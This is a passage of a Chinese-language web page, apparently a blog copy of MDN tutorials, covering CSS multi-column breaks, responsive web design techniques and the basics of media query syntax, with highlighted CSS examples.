solid <span class="hljs-built_in">rgb</span>(<span class="hljs-number">79</span>, <span class="hljs-number">185</span>, <span class="hljs-number">227</span>);<br>  <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span>;<br>  <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">1em</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><iframe class="sample-code-frame" title="列与内容折断 sample" id="frame_列与内容折断" width="100%" height="600" src="https://yari-demos.prod.mdn.mozit.cloud/zh-CN/docs/Learn/CSS/CSS_layout/Multiple-column_Layout/_sample_.%E5%88%97%E4%B8%8E%E5%86%85%E5%AE%B9%E6%8A%98%E6%96%AD.html" loading="lazy" style="box-sizing: content-box; border: 1px solid var(--border-primary); max-width: 100%; width: calc((100% - 2rem) - 2px); background: rgb(255, 255, 255); border-radius: var(--elem-radius); padding: 1rem;"></iframe><h4 id="设置-break-inside"><a href="#设置-break-inside" class="headerlink" title="设置 break-inside"></a>设置 break-inside</h4><p>我们可以使用 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/CSS_Fragmentation">CSS Fragmentation</a> 中声明的属性控制这一特性。这份规范提供了一些属性来控制 multicol 和多页媒体中的内容拆分、折断。比如，在规则 <code>.card</code> 上添加属性<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/break-inside"><code>break-inside</code></a>，并设值 <code>avoid</code> 。<code>.card</code> 是标题和文本的容器，我们不想拆开这个盒子。</p><p>现阶段，增加旧属性 <code>page-break-inside: avoid</code> 能够获得更好的浏览器支持。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.card</span> &#123;<br>  <span class="hljs-attribute">break-inside</span>: avoid;<br>  <span class="hljs-attribute">page-break-inside</span>: avoid;<br>  <span class="hljs-attribute">background-color</span>: <span class="hljs-built_in">rgb</span>(<span class="hljs-number">207</span>,<span class="hljs-number">232</span>,<span class="hljs-number">220</span>);<br>  <span class="hljs-attribute">border</span>: <span class="hljs-number">2px</span> solid <span class="hljs-built_in">rgb</span>(<span class="hljs-number">79</span>,<span class="hljs-number">185</span>,<span class="hljs-number">227</span>);<br>  <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span>;<br>  <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">1em</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>刷新页面，你的盒子就会呆在一起了。</p><iframe class="sample-code-frame" title="设置 break-inside sample" id="frame_设置_break-inside" width="100%" height="600" src="https://yari-demos.prod.mdn.mozit.cloud/zh-CN/docs/Learn/CSS/CSS_layout/Multiple-column_Layout/_sample_.%E8%AE%BE%E7%BD%AE_break-inside.html" loading="lazy" style="box-sizing: content-box; border: 1px solid var(--border-primary); max-width: 100%; width: calc((100% - 2rem) - 2px); background: rgb(255, 255, 255); border-radius: var(--elem-radius); padding: 1rem;"></iframe><h3 id="2-19-响应式设计"><a href="#2-19-响应式设计" class="headerlink" title="2.19 响应式设计"></a>2.19 响应式设计</h3><p>早年设计 Web 时，页面是以适配特定的屏幕大小为考量创建的。如果用户正在使用比设计者考虑到的更小或者更大的屏幕，那么结果从多余的滚动条，到过长的行和没有被合理利用的空间，不一而足。随着人们使用的屏幕尺寸的种类越来越多，出现了响应式网页设计的概念（<em>responsive web design，RWD</em>），RWD 指的是允许 Web 页面适应不同屏幕宽度因素等，进行布局和外观的调整的一系列实践。这是改变我们设计多设备网页的方式的思想，在这篇文章里，我们将会帮你理解掌握它时所需知道的主要技能。</p><p>随着移动 Web 在早期的功能手机上开始成为现实，希望拥抱移动端的公司普遍希望为他们的网站创建一个有着不同的网址的移动版本（大多是像<em>m.example.com</em>或者<em>example.mobi</em>这类）。这意味着一个网站需要开发两个分开的版本，而且要保持时效性。</p><p>除此以外，这些移动网站的体验经常缩水。由于移动设备变得更加强大，足以显示完整的网站，对于那些被困在移动版网站的移动端用户来说，这是很折磨人的，他们因此也没法获取他们知道在支持所有功能的桌面版网站上能找到的信息。</p><h4 id="响应式设计之前的灵活布局"><a href="#响应式设计之前的灵活布局" class="headerlink" title="响应式设计之前的灵活布局"></a>响应式设计之前的灵活布局</h4><p>人们开发了许多方式，尽力解决建设网站时使用液态和固定宽度的方式所带来的弊端。2004 年，Cameron Adams 写了一篇题为《<a href="https://www.themaninblue.com/writing/perspective/2004/09/21/">Resolution dependent layout</a>》的帖子，描述了一种可以创造适应多种屏幕分辨率的设计的方式。这种方式需要 JavaScript 来探测屏幕的分辨率，载入恰当的 CSS。</p><p>Zoe Mickley Gillenwater 深刻影响了<a href="http://zomigi.com/blog/voices-that-matter-slides-available/">她的著作</a>，在里面描述并标准化了可变站点建立的不同方式，试图在充满屏幕和完全保持固定尺寸之间找到最佳平衡。</p><h4 id="响应式设计"><a href="#响应式设计" class="headerlink" title="响应式设计"></a>响应式设计</h4><p>“响应式设计”这个词是<a href="https://alistapart.com/article/responsive-web-design/">Ethan Marcotte 在 2010 年首度提出的</a>，他将其描述为三种技术的混合使用。</p><ol><li>第一个是液态网格，这早先已由 Gillenwater 进行探讨，可以在 Marcotte 的文章《<a href="https://alistapart.com/article/fluidgrids/">Fluid Grids</a>》（出版于 2009 年的《A List Apart》上）中读到。</li><li>第二个是<a href="https://unstoppablerobotninja.com/entry/fluid-images">液态图像</a>的理念。通过使用相当简单的将设置<code>max-width</code>属性设置为<code>100%</code>的技术，图像可以在包含它们的列变得比图像原始尺寸窄的时候，缩放得更小，但总不会变得更大。这使得图像可以被缩放，以被放到一个灵活尺寸的列，而不是溢出出去，同时也不会在列宽于图像的时候，使图像变得太大以至于画质变得粗糙。</li><li>第三个关键的组件是<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/Media_Queries">媒体查询</a>。媒体查询使以往 Cameron Adams 探讨过的、由 JavaScript 实现的布局类型切换，可以只使用 CSS 实现。和所有尺寸的屏幕都使用一种布局不同的是，布局是可以改变的：侧栏可以在小屏幕上重新布局，而替代用的导航栏也可以显示出来。</li></ol><p>需要你理解的很重要的一点是<strong>响应式 Web 设计不是单独的技术</strong>，它是描述 Web 设计的一种方式、或者是一组最佳实践的一个词，它是用来建立可以<strong>响应</strong>查看内容的设备的样式的一个词。在 Marcotte’s 原来的探索中，这意味着灵活网格（使用 float）和媒体查询，但是在这篇文章写就的几乎十年以后，Web 的响应式工作已经成为了默认做法。现代的 CSS 布局方式基本上就是响应式的，而且我们在 Web 平台上内置了新的东西，使得设计响应式站点变得容易。</p><p>这篇文章的余下部分会为你指出，在建立响应式站点的时候，你可能会用到的各式 Web 平台的特色功能。</p><h4 id="媒介查询"><a href="#媒介查询" class="headerlink" title="媒介查询"></a>媒介查询</h4><p>响应式设计仅仅是因为媒介查询才新兴起来的。媒介查询第三级规范已经在 2009 年成为了候选推荐，这意味着它可视为准备好在浏览器中开始支持了。媒介查询允许我们运行一系列测试，例如用户的屏幕是否大于某个宽度或者某个分辨率，并将 CSS 选择性地适应用户的需要应用在样式化页面上。</p><p>例如，下面的媒体查询进行测试，以知晓当前的 Web 页面是否被展示为屏幕媒体（也就是说不是印刷文档），且视口至少有 800 像素宽。用于<code>.container</code>选择器的 CSS 将只会在这两件前提存在的情况下应用。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-keyword">@media</span> screen <span class="hljs-keyword">and</span> (<span class="hljs-attribute">min-width</span>: <span class="hljs-number">800px</span>) &#123;<br>  <span class="hljs-selector-class">.container</span> &#123;<br>    <span class="hljs-attribute">margin</span>: <span class="hljs-number">1em</span> <span class="hljs-number">2em</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>你可以在一张样式表上加入多条媒体查询，调整整个页面或者部分页面以达到适应各式屏幕尺寸的最佳效果。媒体查询，以及样式改变时的点，被叫做<em>断点</em>（breakpoints）。</p><p>使用媒体查询时的一种通用方式是，为窄屏设备（例如移动设备）创建一个简单的单栏布局，然后检查是否是大些的屏幕，在你知道你有足够容纳的屏幕宽度的时候，开始采用一种多栏的布局。这经常被描述为<strong>移动优先</strong>设计。</p><p>在 MDN 文档中的<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/Media_Queries">媒体查询</a>中了解更多</p><h4 id="灵活网格"><a href="#灵活网格" class="headerlink" title="灵活网格"></a>灵活网格</h4><p>响应式站点不只是在断点之间改变它们的布局，它们是建立在灵活网格上的。一个灵活网格意味着你不需要适配每个可能使用的设备尺寸，然后为其建立一个精确到像素级的适配布局。那种方式在现存有如此多种不同大小设备的前提下是不可能实现的，比如至少在台式机上，人们并不总是让他们的浏览器窗口最大化的。</p><p>使用灵活网格，你只需要加进去一个断点，在内容看起来不齐整的时候改变设计。例如如果一行随着屏幕大小增加而增长得不可读的长，或者是一个盒子在变窄时把每行的两个单词挤到一起。</p><p>早年间进行响应式设计的时候，我们唯一的实现布局的选项是使用<a href="https://developer.mozilla.org/zh-CN/docs/Learn/CSS/CSS_layout/Floats">float</a>。灵活浮动布局是这样实现的，让每个元素都有一个作为宽度的百分数，而且确保整个布局的和不会超过 100%。在他对于液态网格文章的原文中，Marcotte 详细描述了一种布局的法则，通过使用像素并把布局转化为百分数的方式设计。</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">target / context <span class="hljs-operator">=</span> result<br></code></pre></td></tr></table></figure><p>例如如果我们的预期栏尺寸为 60 像素，而且它所在的上下文（或者容器）为 960 像素，我们在将零点二的空间移动到右边以后，用 960 去除 60，得到我们能够使用在我们的 CSS 上的值。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.col</span> &#123;<br>  <span class="hljs-attribute">width</span>: <span class="hljs-number">6.25%</span>; <span class="hljs-comment">/* 60 / 960 = 0.0625 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>这种方式将会在今天整个 Web 上的许多地方上看到，而且它被我们的<a href="https://developer.mozilla.org/zh-CN/docs/Learn/CSS/CSS_layout/Legacy_Layout_Methods">Legacy layout methods</a>一文中的布局一节中记载。可能你将会在工作中遇到使用这种方式的站点，所以有必要理解它，即使是在你不用建立一个使用浮动基础的灵活网格的情况下。</p><h4 id="现代布局技术"><a href="#现代布局技术" class="headerlink" title="现代布局技术"></a>现代布局技术</h4><p>现代布局方式，例如<a href="https://developer.mozilla.org/zh-CN/docs/Learn/CSS/CSS_layout/Multiple-column_Layout">多栏布局</a>、<a href="https://developer.mozilla.org/zh-CN/docs/Learn/CSS/CSS_layout/Flexbox">伸缩盒</a>和<a href="https://developer.mozilla.org/zh-CN/docs/Learn/CSS/CSS_layout/Grids">网格</a>默认是响应式的。它们都假设你在尽力创建一个可伸缩网格，而且给了你更容易这样做的方式。</p><h4 id="多个列"><a href="#多个列" class="headerlink" title="多个列"></a>多个列</h4><p>这些布局方式中最老的一个是多个列，即当你指定一个<code>column-count</code>的时候，这意指你希望把你的内容分成多少列。浏览器之后会算出这些列的大小，这是一个随着屏幕尺寸变化的尺寸。</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs axapta">.<span class="hljs-built_in">container</span> &#123;<br>  column-<span class="hljs-keyword">count</span>: <span class="hljs-number">3</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果你却去指定<code>column-width</code>的话，你是在指定一个<em>最小</em>宽度。浏览器会尽可能多数量地创建这一宽度的列，只要它们可以恰当地放进容器里面，然后将所有列之间的剩余空间共享出去。因而列的数量会随着空间的多少而改变。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">column-width</span>: <span class="hljs-number">10em</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="伸缩盒"><a href="#伸缩盒" class="headerlink" title="伸缩盒"></a>伸缩盒</h4><p>在伸缩盒中，初始的行为是，弹性的物件将参照容器里面的空间的大小，缩小和分布物件之间的空间。通过更改<code>flex-grow</code>和 <code>flex-shrink</code>的值，你可以指示在物件遇到周围有更多或者更少的空间的情况下，你所期望的物件表现。</p><p>在下面的示例中，和布局专题的<a href="https://developer.mozilla.org/zh-CN/docs/Learn/CSS/CSS_layout/Flexbox#flexible_sizing_of_flex_items">Flexbox: Flexible sizing of flex items</a>中所描述的那样，使用了<code>flex: 1</code>的简写，可伸缩物件每个将会占据一份可伸缩容器中相等大小的空间。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">display</span>: flex;<br>&#125;<br><br><span class="hljs-selector-class">.item</span> &#123;<br>  <span class="hljs-attribute">flex</span>: <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>备注：</strong> 作为一个示例，我们已经重构了上面的简单响应式布局，这次我们用了伸缩盒。你可以看看我们是怎么样才不再需要使用奇怪的百分数值来计算列的尺寸的：<a href="https://mdn.github.io/css-examples/learn/rwd/flex-based-rwd.html">示例</a>、<a href="https://github.com/mdn/css-examples/blob/master/learn/rwd/flex-based-rwd.html">源代码</a>。</p><h4 id="CSS-网格"><a href="#CSS-网格" class="headerlink" title="CSS 网格"></a>CSS 网格</h4><p>在 CSS 网格布局中，<code>fr</code>单位许可了跨网格轨道可用空间的分布。下面的示例创建了一个有着 3 个大小为<code>1fr</code>的轨道的网格容器。这会创建三个列轨道，每个占据了容器中可用空间的一部分。你可以在<a href="https://developer.mozilla.org/zh-CN/docs/Learn/CSS/CSS_layout/Grids#flexible_grids_with_the_fr_unit">Flexible grids with the fr unit</a>下的学习布局网格专题了解更多和这一方式相关的信息。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-class">.container</span> &#123;<br>  <span class="hljs-attribute">display</span>: grid;<br>  <span class="hljs-attribute">grid-template-columns</span>: <span class="hljs-number">1</span>fr <span class="hljs-number">1</span>fr <span class="hljs-number">1</span>fr;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>备注：</strong> 网格布局版本的代码要更简单，因为我们可以在.wrapper 上定义列<a href="https://mdn.github.io/css-examples/learn/rwd/grid-based-rwd.html">：示例</a>，<a href="https://github.com/mdn/css-examples/blob/master/learn/rwd/grid-based-rwd.html">源代码</a>。</p><h4 id="响应式图像"><a href="#响应式图像" class="headerlink" title="响应式图像"></a>响应式图像</h4><p>最简单的处理响应式图像的方式是在 Marcotte 的早年的关于响应式设计的文章上所描述的那样。基本来说，你可以用一张有着所需最大尺寸的图像。然后缩放它。这仍然是今日所使用的一种方式，而且在大多数样式表里面，你在某些地方可以找到下面的 CSS：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">img</span> &#123;<br>  <span class="hljs-attribute">max-width</span>: <span class="hljs-number">100%</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这种方式有显然的弊端。图像有可能会显示得比它的原始尺寸小很多，以至于浪费带宽——一个移动端用户会下载几倍于他们在浏览器窗口中实际看到的大小的图像。此外，你可能不想在移动端和桌面端有相同的图像宽高比例。例如，在移动端，方形图像的表现会很好，但是在桌面端显示同样的内容则应用宽图像。或者，认识到移动端更小尺寸的图像的你也许会希望同时展示一张不同的图像，一张在小一点的屏幕上更容易理解的图像。这些东西不能简单通过缩放图像解决。</p><p>响应式图像，使用了<code>&lt;picture&gt;</code>元素和<code>&lt;img&gt; </code>srcset和sizes 特性，解决了这两个问题。你可以提供附带着“提示”（描述图像最适合的屏幕尺寸和分辨率的元数据）的多种尺寸，浏览器将会选择对设备最合适的图像，以确保用户下载尺寸适合他们使用的设备的图像。</p><p>你也可以给用于不同尺寸的图像做“艺术指导”，为不同的屏幕尺寸提供不同的图像裁切或者完全不同的图像。</p><p>你可以在 MDN 这里的学习 HTML 一节中找到详细的<a href="https://developer.mozilla.org/zh-CN/docs/Learn/HTML/Multimedia_and_embedding/Responsive_images">响应式图像指南</a>。</p><h4 id="响应式排版"><a href="#响应式排版" class="headerlink" title="响应式排版"></a>响应式排版</h4><p>在早期的工作没有考虑的一个响应式设计的元素是响应式排版的理念。本质上讲，这描述了根据屏幕真实使用范围的多少，在媒体查询的同时改变字体大小。</p><p>在本例子中，我们想讲我们的一级标题设置为<code>4rem</code>，也就是说它将会有我们的基础字体的四倍大。这真的是个很大的标题！我们只想在大些的屏幕上有这么个超大的标题，那我们先弄个小点的标题，再使用媒体查询，在我们知道用户使用至少<code>1200px</code>的屏幕的时候，拿大些的尺寸覆写它。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">html</span> &#123;<br>  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">1em</span>;<br>&#125;<br><br><span class="hljs-selector-tag">h1</span> &#123;<br>  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">2rem</span>;<br>&#125;<br><br><span class="hljs-keyword">@media</span> (<span class="hljs-attribute">min-width</span>: <span class="hljs-number">1200px</span>) &#123;<br>  <span class="hljs-selector-tag">h1</span> &#123;<br>    <span class="hljs-attribute">font-size</span>: <span class="hljs-number">4rem</span>;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们已经编辑了我们在上面的响应式网格示例，让它同时包含了使用了圈出方式的响应式类型。你也可以看下随着布局变为两栏，标题是怎样转换大小的。</p><p>移动端，标题变小了：</p><p><img src="https://developer.mozilla.org/en-US/docs/Learn/CSS/CSS_layout/Responsive_Design/mdn-rwd-font-mobile.png" alt="A stacked layout with a small heading size."></p><p>但在桌面端，我们看到了大点的标题：</p><p><img src="https://developer.mozilla.org/en-US/docs/Learn/CSS/CSS_layout/Responsive_Design/mdn-rwd-font-desktop.png" alt="A two column layout with a large heading."></p><p><strong>备注：</strong> 查看这个编排好的示例：<a href="https://mdn.github.io/css-examples/learn/rwd/type-rwd.html">示例</a>，<a href="https://github.com/mdn/css-examples/blob/master/learn/rwd/type-rwd.html">源代码</a>。</p><p>正如这种排版方式展示的这样，你不需要让媒介查询只能改变页面的布局。它们也能用来调节每个元素，让它们在别的大小的屏幕上更加可用或者更具吸引力。</p><h4 id="使用视口单位实现响应式排版"><a href="#使用视口单位实现响应式排版" class="headerlink" title="使用视口单位实现响应式排版"></a>使用视口单位实现响应式排版</h4><p>一个有趣的方式是使用视口单位<code>vw</code>来实现响应式排版。<code>1vw</code>等同于视口宽度的百分之一，即如果你用<code>vw</code>来设定字体大小的话，字体的大小将总是随视口的大小进行改变。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">h1</span> &#123;<br>  <span class="hljs-attribute">font-size</span>: <span class="hljs-number">6vw</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>问题在于，当做上面的事情的时候，因为文本总是随着视口的大小改变大小，用户失去了放缩任何使用<code>vw</code>单位的文本的能力。<strong>所以你永远都不要只用 viewport 单位设定文本。</strong></p><p>这里有一个解决方法，它使用了<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/calc"><code>calc()</code></a>，如果你将<code>vw</code>单位加到了使用固定大小（例如<code>em</code>或者<code>rem</code>）的值组，那么文本仍然是可放缩的。基本来说，是<code>vw</code>加在了放缩后的值上。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">h1</span> &#123;<br>  <span class="hljs-attribute">font-size</span>: <span class="hljs-built_in">calc</span>(<span class="hljs-number">1.5rem</span> + <span class="hljs-number">3vw</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>这就是说，我们只需要指定标题的字体大小一次，而不是为移动端设定它，然后再在媒介查询中重新定义它。字体会在你增加视口大小的时候逐渐增大。</p><p><strong>备注：</strong> 查看这种情况的一个编排好的示例： <a href="https://mdn.github.io/css-examples/learn/rwd/type-vw.html">示例</a>，<a href="https://github.com/mdn/css-examples/blob/master/learn/rwd/type-vw.html">源代码</a>。</p><h4 id="视口元标签"><a href="#视口元标签" class="headerlink" title="视口元标签"></a>视口元标签</h4><p>如果你看看一张响应式页面的 HTML 源代码，你通常将会在文档的<code>&lt;head&gt;</code>看到下面的<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/meta">&#96;&#96;</a>标签。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;meta <span class="hljs-attribute">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attribute">content</span>=<span class="hljs-string">&quot;width=device-width,initial-scale=1&quot;</span>&gt;<br></code></pre></td></tr></table></figure><p>这个元标签告诉移动端浏览器，它们应该将视口宽度设定为设备的宽度，将文档放大到其预期大小的 100%，在移动端以你所希望的为移动优化的大小展示文档。</p><p>为何需要这个？因为移动端浏览器倾向于在它们的视口宽度上说谎。</p><p>这个元标签的存在，是由于原来 iPhone 发布以后，人们开始在小的手机屏幕上阅览网页，而大多数站点未对移动端做优化的缘故。移动端浏览器因此会把视口宽度设为 960 像素，并以这个宽度渲染页面，结果展示的是桌面布局的缩放版本。其他的移动端浏览器（例如谷歌安卓上的）也是这么做的。用户可以在站点中放大、移动，查看他们感兴趣的那部分，但是这看起来很不舒服。如果你不幸遇到了一个没有响应式设计的网站，今天你还会看到这种情况。</p><p>麻烦的是，你的带断点和媒介查询的响应式设计不会在移动端浏览器上像预期那样工作。如果你有个窄屏布局，在 480 像素及以下的视口宽度下生效，但是视口是按 960 像素设定的，你将不会在移动端看到你的窄屏布局。通过设定<code>width=device-width</code>，你用设备的实际宽度覆写了苹果默认的<code>width=960px</code>，然后你的媒介查询就会像预期那样生效。</p><p><strong>所以你应该在你的文档头部*总是*包含上面那行 HTML。</strong></p><p>和视口元标签一起，你可以使用另外几个设定，但大体说来，上面那行就是你想要使用的。</p><ul><li><code>initial-scale</code>：设定了页面的初始缩放，我们设定为 1。</li><li><code>height</code>：特别为视口设定一个高度。</li><li><code>minimum-scale</code>：设定最小缩放级别。</li><li><code>maximum-scale</code>：设定最大缩放级别。</li><li><code>user-scalable</code>：如果设为<code>no</code>的话阻止缩放。</li></ul><p>你应该避免使用<code>minimum-scale</code>、<code>maximum-scale</code>，尤其是将<code>user-scalable</code>设为<code>no</code>。用户应该有权力尽可能大或小地进行缩放，阻止这种做法会引起访问性问题。</p><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>响应式设计指的是一个响应浏览环境的网页或者应用设计。它涵盖了很多 CSS 和 HTML 的功能和技术，现在基本上就是我们默认建设网站的方式。想一下你在手机上访问的网站，遇到一个缩放的桌面版网站，或者你需要向侧边滚动来寻找东西的网站可能是相当不寻常的。这是因为 Web 已经迁移到了这种响应式设计的方式上。</p><p>在这些课里学到的布局方式的帮助下，实现响应式设计也变得愈加简单。如果你今天新近了解 Web 开发，那么你与响应式设计早期相比，手边有多得多的工具。因而，你有必要检查下你所引用的任何材料的年纪。尽管历史上的文章仍然有用，现代的 CSS 和 HTML 的使用让创建一个优雅且实用的设计变得远远更加容易，且无论你的访客使用什么设备浏览网站。</p><h3 id="2-20-媒体查询入门指南"><a href="#2-20-媒体查询入门指南" class="headerlink" title="2.20 媒体查询入门指南"></a>2.20 媒体查询入门指南</h3><p>最简单的媒体查询语法看起来是像这样的：</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elm">@media media-<span class="hljs-keyword">type</span> and (media-feature-rule) &#123;<br>  /* <span class="hljs-type">CSS</span> rules go here */<br>&#125;<br></code></pre></td></tr></table></figure><p>Copy to Clipboard</p><p>它由以下部分组成：</p><ul><li>一个媒体类型，告诉浏览器这段代码是用在什么类型的媒体上的（例如印刷品或者屏幕）；</li><li>一个媒体表达式，是一个被包含的 CSS 生效所需的规则或者测试；</li><li>一组 CSS 规则，会在测试通过且媒体类型正确的时候应用。</li></ul><h4 id="媒体类型"><a href="#媒体类型" class="headerlink" title="媒体类型"></a>媒体类型</h4><p>你可以指定的媒体类型为：</p><ul><li><code>all</code></li><li><code>print</code></li><li><code>screen</code></li><li><code>speech</code></li></ul><p>下面的媒体查询将会在页面被打印的时候把 body 设定为只有 12pt 大小。当页面在浏览器中载入的时候，它将不会生效。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-keyword">@media</span> print &#123;<br>    <span class="hljs-selector-tag">body</span> &#123;<br>        <span class="hljs-attribute">font-size</span>: <span class="hljs-number">12pt</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p><strong>备注：</strong>这里的媒体类型是和所谓的<a href="https://developer.mozilla.org/zh-CN/docs/Glossary/MIME_type">MIME type</a>不同的东西。</p></blockquote><p><strong>备注：</strong> 在第三级媒体查询规范中，定义了其他一些媒体类型，它们已经不被建议使用，而且应该被避免使用。</p><blockquote><p><strong>备注：</strong>媒体类型是可选的，如果你没有在媒体查询中指示一个媒体类型的话，那么媒体查询默认会设为用于全部媒体类型。</p></blockquote><h4 id="媒体特征规则"><a href="#媒体特征规则" class="headerlink" title="媒体特征规则"></a>媒体特征规则</h4><p>在指定了类型以后，你可以用一条规则指向一种媒体特征。</p><h4 id="宽和高"><a href="#宽和高" class="headerlink" title="宽和高"></a>宽和高</h4><p>为了建立响应式设计（已经广受浏览器支持），我们一般最常探测的特征是视口宽度，而且我们可以使用<code>min-width</code>、<code>max-width</code>和<code>width</code>媒体特征，在视口宽度大于或者小于某个大小——或者是恰好处于某个大小——的时候，应用 CSS。</p><p>这些特征是用来创建响应不同屏幕大小的布局的。例如，要想在视口正好是 600 像素的时候，让 body 的文本变为红色，你可能会使用下面的媒体查询。</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-keyword">@media</span> screen <span class="hljs-keyword">and</span> (<span class="hljs-attribute">width</span>: <span class="hljs-number">600px</span>) &#123;<br>    <span class="hljs-selector-tag">body</span> &#123;<br>        <span class="hljs-attribute">color</span>: red;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在浏览器中<a href="https://mdn.github.io/css-examples/learn/media-queries/width.html">打开这个示例</a>，或者<a href="https://github.com/mdn/css-examples/blob/master/learn/media-queries/width.html">查看源代码</a>。</p><p><code>width</code>（和<code>height</code>）媒体特征可以以数值范围使用，于是就有了<code>min-</code>或者<code>max-</code>的前缀，指示所给的值是最小值还是最大值。例如，要让颜色在视口窄于 400 像素的时候变成蓝色的话，可以用<code>max-width</code>：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-keyword">@media</span> screen <span class="hljs-keyword">and</span> (<span class="hljs-attribute">max-width</span>: <span class="hljs-number">400px</span>) &#123;<br>    <span class="hljs-selector-tag">body</span> &#123;<br>        <span class="hljs-attribute">color</span>: blue;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在浏览器中<a href="https://mdn.github.io/css-examples/learn/media-queries/max-width.html">打开示例</a>，或者<a href="https://github.com/mdn/css-examples/blob/master/learn/media-queries/max-width.html">查看源代码</a>。</p><p>实践中，使用最小值和最大值对响应式设计有很多的用处，所以你会很少见到<code>width</code>或<code>height</code> 单独使用的情况。</p><p>还有许多其他媒体特征可以供你测试，尽管于 4 级和 5 级媒体查询规范中引入了一些新特征，它们受浏览器支持仍然有限。在 MDN 上，每个特征都已经同浏览器支持信息一同记载下来，你可以在<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/Media_Queries/Using_media_queries#media_features">使用媒体查询：媒体特征</a>中找到一张完整的列表。</p><h4 id="朝向"><a href="#朝向" class="headerlink" 